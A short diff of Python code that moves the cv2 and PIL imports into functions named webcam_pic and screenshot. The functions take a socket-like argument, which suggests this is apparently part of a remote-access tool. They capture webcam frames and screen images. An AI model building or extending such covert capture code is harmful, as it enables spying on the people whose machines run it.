@@ -8,6 +8,7 @@ import os
 
 
 def webcam_pic(s,data):
+     import cv2
      cam_port = 0
      cam = cv2.VideoCapture(cam_port)
      result, image = cam.read()
@@ -30,6 +31,7 @@ def download(s,data):
 
 
 def screenshot(s,data):
+     from PIL import ImageGrab
      buffer=BytesIO()
      screenshot = ImageGrab.grab()
      screenshot.save(buffer,format="PNG")
